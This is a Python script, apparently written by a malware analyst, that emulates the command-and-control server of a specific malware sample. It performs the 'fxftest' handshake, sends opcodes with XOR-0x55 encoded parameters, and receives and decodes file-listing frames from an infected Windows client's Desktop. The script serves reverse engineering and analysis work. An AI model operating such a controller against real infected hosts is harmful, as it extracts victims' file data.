#!/usr/bin/env python3
import socket
import binascii
import datetime
import struct
import time

HOST = ''              # 0.0.0.0
PORT = 443
RECV_SZ = 65535
TIMEOUT_S = 120        # timeout general de socket
LISTING_IDLE_S = 8.0   # inactividad para dar por finalizado el listado (opcode 2)

# Heurística para reconocer el bloque de 256B tras opcode1 (exfil previa)
MAGIC_PARAM_REQ = b'v\x16od\x11og\x0fofv'  # prefijo observado antes de los 0x55

# --------- utilidades ---------
def hexdump(b: bytes) -> str:
    hx = binascii.hexlify(b).decode()
    return ' '.join(hx[i:i+2] for i in range(0, len(hx), 2))

def xor55(b: bytes) -> bytes:
    return bytes([x ^ 0x55 for x in b])

def pad_to_256(b: bytes) -> bytes:
    if len(b) >= 256:
        b = b[:256]
        # asegurar NUL final si cabe
        if b and b[-1] != 0:
            b = b[:-1] + b'\x00'
        return b
    return b + b'\x00' + b'\x00' * (256 - len(b) - 1)

def make_handshake_reply() -> bytes:
    # 8 bytes; compara sólo los primeros 7 (fxftest)
    return b"fxftest\x00"

def make_command_packet_no_param(opcode: int) -> bytes:
    # 0x104 bytes: [DWORD opcode LE] + 0x100 de ceros
    pkt = struct.pack("<I", opcode)
    return pkt + b"\x00" * (0x104 - len(pkt))

def make_command_packet_with_param(opcode: int, param_256_xored: bytes) -> bytes:
    # Estructura esperada por el malware para opcode 2:
    # DWORD opcode (4) + 256 bytes de parámetro (xored) + padding hasta 0x104
    if len(param_256_xored) != 256:
        raise ValueError("param_256_xored debe medir 256 bytes")
    pkt = struct.pack("<I", opcode) + param_256_xored
    if len(pkt) < 0x104:
        pkt += b"\x00" * (0x104 - len(pkt))
    return pkt

def looks_like_param_block(b: bytes) -> bool:
    # exfil de FUN_004018C0: típicamente 256 bytes, con prefijo y muchos 0x55
    if len(b) == 256 and (b.startswith(MAGIC_PARAM_REQ) or b.count(0x55) > 100):
        return True
    return False

def safe_ascii(b: bytes) -> bytes:
    # para imprimir sin reventar la terminal
    return bytes(ch if 32 <= ch < 127 else 0x2E for ch in b)

# --------- lógica principal ---------
def handle_client(c: socket.socket, addr):
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f'\n[+] {ts} Conexión de {addr[0]}:{addr[1]}')
    state = "WAIT_HELLO"   # -> WAIT_SYSINFO -> AFTER_OPCODE1_EXFIL -> SENT_OPCODE2_WAIT_STATUS -> LISTING
    sent_opcode2 = False

    try:
        c.settimeout(TIMEOUT_S)
        last_data_ts = time.time()

        while True:
            try:
                data = c.recv(RECV_SZ)
            except socket.timeout:
                # Inactividad general; seguimos esperando salvo que en listado usemos LISTING_IDLE_S
                print('    [*] idle timeout; keeping connection open...')
                continue

            if not data:
                print('    [*] Client closed connection.')
                break

            last_data_ts = time.time()
            print(f'    [*] Recibido ({len(data)} bytes):')
            print(f'        ASCII: {safe_ascii(data)!r}')
            print(f'        HEX  : {hexdump(data)}')

            # 1) HELLO
            if state == "WAIT_HELLO" and b'fxftest' in data:
                resp = make_handshake_reply()
                c.sendall(resp)
                print(f'    [*] Enviado handshake ({len(resp)} bytes)')
                state = "WAIT_SYSINFO"
                continue

            # 2) SYSINFO (512 bytes)
            if state == "WAIT_SYSINFO":
                if len(data) >= 512:
                    print("    [*] Enviando opcode 1...")
                    cmd = make_command_packet_no_param(1)   # opcode 1
                    c.sendall(cmd)
                    print(f'    [*] Enviado comando ({len(cmd)} bytes), opcode=1')
                    state = "AFTER_OPCODE1_EXFIL"
                continue

            # 3) Tras opcode 1: esperamos el bloque de 256B (exfil previa) y disparamos opcode 2 con patrón
            if state == "AFTER_OPCODE1_EXFIL":
                if looks_like_param_block(data):
                    print("    [*] Bloque de 256B (exfil post-op1) detectado. Enviando opcode 2 con patrón…")

                    # Patrón deseado (en claro) → NUL-terminated → 256 → XOR 0x55
                    pattern_clear = r"C:\Users\usuario\Desktop\*".encode('ascii')
                    param256 = pad_to_256(pattern_clear)
                    param256_xor = xor55(param256)

                    pkt2 = make_command_packet_with_param(2, param256_xor)
                    c.sendall(pkt2)
                    print(f'    [*] Enviado opcode=2 ({len(pkt2)} bytes) con patrón: {pattern_clear!r}')
                    state = "SENT_OPCODE2_WAIT_STATUS"
                    sent_opcode2 = True
                else:
                    # puede llegar ruido/keepalive; seguimos a la espera
                    pass
                continue

            # 4) Tras mandar opcode 2: primero llega un status de 2 bytes: 'o' (ok) o 'q' (no hay)
            if state == "SENT_OPCODE2_WAIT_STATUS":
                # Algunos clientes envían exactamente 2 bytes; otros pueden agregar algo más:
                if len(data) >= 2:
                    status = data[:2]
                    print(f"    [*] STATUS inicial opcode2 (2B): {status!r} HEX={hexdump(status)}")
                    if status and (status[0:1] in (b'o', b'q', b'O', b'Q')):
                        if status[0:1] in (b'q', b'Q'):
                            print("    [!] El cliente indica 'no hay coincidencias' para el patrón.")
                            # Volvemos al estado activo por si queremos mandar otro opcode
                            state = "AFTER_OPCODE1_EXFIL"
                        else:
                            print("    [*] Hay coincidencias. Entrando en modo LISTING (lectura de frames 0x204)…")
                            state = "LISTING"
                        # Si viniera algo más pegado a esos 2 bytes, deja que el siguiente ciclo lo procese.
                    else:
                        # Si no reconocemos, igualmente entramos en LISTING e intentamos leer frames
                        print("    [!] STATUS no reconocible; intento seguir con LISTING…")
                        state = "LISTING"
                continue

            # 5) LISTING: recibir frames de 0x204, desXOR los primeros 0x100 y responder ACK (2 bytes)
            if state == "LISTING":
                # Puede llegar un frame completo o fragmentado. Procesa por bloques de 0x204.
                buf = data
                while len(buf) >= 0x204:
                    frame = buf[:0x204]
                    buf = buf[0x204:]

                    head_xored = frame[:0x100]
                    tail = frame[0x100:]  # 0x104 bytes siguientes

                    head_clear = xor55(head_xored)
                    print("    [*] FRAME 0x204 recibido:")
                    print(f"        HEAD (deofuscado, 0x100): {safe_ascii(head_clear)!r}")
                    print(f"        TAIL (0x104) HEX: {hexdump(tail)}")

                    # ACK de 2 bytes (para avanzar al siguiente). Si envías algo que el cliente “no acepta”,
                    # te reenvía el mismo frame (lo vimos en el disasm).
                    ack = b"\x00\x00"
                    c.sendall(ack)
                    print(f"        [+] ACK enviado (2B): {hexdump(ack)}")

                    last_data_ts = time.time()

                # Si sobran bytes (< 0x204), se procesarán en el siguiente recv
                # Salida por inactividad específica del listado:
                if time.time() - last_data_ts > LISTING_IDLE_S:
                    print(f"    [*] No llegan más frames (>{LISTING_IDLE_S:.1f}s). Fin de listado.")
                    # Vuelve al estado post-op1 por si quieres lanzar otro opcode
                    state = "AFTER_OPCODE1_EXFIL"

                continue

    except Exception as e:
        print(f'    [!] Error: {e}')
    finally:
        try:
            c.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        c.close()
        print('    [*] Conexión cerrada.')

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f'[*] Escuchando en 0.0.0.0:{PORT}')
    try:
        while True:
            c, addr = s.accept()
            handle_client(c, addr)
    except KeyboardInterrupt:
        print('\n[!] Interrumpido, cerrando.')
    finally:
        s.close()

if __name__ == "__main__":
    main()
